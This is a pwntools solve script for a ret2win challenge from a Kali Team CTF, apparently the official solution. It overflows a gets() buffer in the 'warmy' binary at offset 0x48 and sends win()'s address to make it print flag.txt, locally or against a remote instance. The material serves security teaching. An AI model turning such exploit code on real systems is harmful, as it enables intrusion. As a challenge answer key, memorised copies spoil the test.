#!/usr/bin/env python3
"""
Warmy (Kali Team CTF 26) — ret2win

Vulnerability: gets() into buffer at [rbp-0x40] (no canary, no PIE).
Goal: overwrite return address with win() which prints flag.txt.

Local:
  cd files/player
  python3 ../../../solve/solve.py

Remote (after Start instance on platform):
  python3 solve.py remote HOST PORT
"""
from __future__ import annotations

import sys
from pathlib import Path

from pwn import *

# Default: package layout files/player/{warmy,ld,libc,flag.txt}
HERE = Path(__file__).resolve().parent
CANDIDATES = [
    HERE.parent / "files" / "player" / "warmy",
    Path.cwd() / "warmy",
]
BIN = next(p for p in CANDIDATES if p.exists())
WORKDIR = BIN.parent

context.binary = elf = ELF(str(BIN), checksec=False)
context.log_level = "info"

# From disassembly of vuln():
#   sub rsp, 0x40
#   lea rax, [rbp-0x40]
#   call gets
# => 0x40 bytes buffer + 8 bytes saved RBP = 0x48 to saved RIP
OFFSET = 0x48
WIN = elf.symbols["win"]


def start(argv: list[str]):
    if len(argv) >= 4 and argv[1] == "remote":
        return remote(argv[2], int(argv[3]))
    ld = WORKDIR / "ld-linux-x86-64.so.2"
    if ld.exists():
        return process(
            [str(ld), "--library-path", str(WORKDIR), str(BIN)],
            cwd=str(WORKDIR),
        )
    return process([str(BIN)], cwd=str(WORKDIR))


def main(argv: list[str]) -> int:
    io = start(argv)
    io.recvuntil(b"\n", timeout=3)  # "Hola! "
    payload = flat({OFFSET: p64(WIN)})
    io.sendline(payload)
    out = io.recvall(timeout=3)
    sys.stdout.buffer.write(out)
    if not out.endswith(b"\n"):
        print()
    io.close()

    # win() prints: "The Flag: <contents of flag.txt>"
    if b"The Flag:" in out or b"KaliTeam{" in out:
        return 0
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))